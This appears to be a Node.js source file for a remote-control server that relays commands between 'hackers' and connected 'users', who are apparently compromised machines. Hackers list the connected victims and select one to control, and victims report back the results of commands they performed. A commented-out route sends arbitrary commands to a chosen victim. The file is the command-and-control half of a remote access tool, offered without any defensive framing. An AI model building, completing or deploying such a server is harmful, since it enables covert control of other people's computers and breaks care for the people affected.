const express = require("express");
const bodyParser = require("body-parser");
const http = require("http");
// const io = require("socket.io")(http);
const SEND_PORT = 7681;
const REC_PORT = 7670;
const io = require("socket.io");

const sendIO = io.listen(SEND_PORT);
const recIO = io.listen(REC_PORT);

const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const users = {};
const hackers = {};

sendIO.on("connection", (socket) => {
  let socketUser = "";
  log("connection", `${socket.client.id}`);

  socket.on("new-user", (newUser) => {
    socketUser = newUser.substr(0, newUser.length - 1);
    log("new user", `${socketUser}`);
    users[socketUser] = socket;
  });

  socket.on("performed-command", (data) => {
    const { command, result } = data;
    log("command", `${command}`);
    log("result", `${result}`);
  });

  socket.on("disconnect", () => {
    log("disconnect", `${socketUser}`);
    delete users[socketUser];
  });
});

//Replace this with receiver socket once finished
recIO.on("connection", (socket) => {
  let socketUser = "";
  let currentConnection = "";

  log("connection", `${socket.client.id}`);

  socket.on("new-hacker", (newHacker) => {
    socketUser = newHacker.substr(0, newHacker.length - 1);
    log("new hacker", socketUser);
    hackers[socketUser] = socket;
  });

  socket.on("show-users", () => {
    log(socketUser, "show");
    socket.emit("show-users", Object.keys(users));
  });

  socket.on("connect-user", (connectTo) => {
    log(socketUser, `Connecting to ${connectTo}`);
    if (!(connectTo in users)) {
      socket.emit("connect-user", 0);
    } else {
      currentConnection = connectTo;
      socket.emit("connect-user", 1);
    }
  });

  socket.on("return", () => {
    log(socketUser, `Terminating connection to ${currentConnection}`);
    currentConnection = "";
    socket.emit("return");
  });

  socket.on("disconnect", () => {
    log("hacker disconnect", `${socketUser}`);
    delete hackers[socketUser];
  });
});

// app.get("/sendCommand/:user/:command", (req, res) => {
//   const { user, command } = req.params;
//   users[user].emit("perform-command", command);
//   return res.json({ yes: 1 });
// });

// app.listen(REC_PORT, () => {
//   console.log(`Remote Controller Server is listening on port ${REC_PORT}`);
// });

function log(title, message) {
  console.log(`[${title.toUpperCase()}] ${message}`);
}
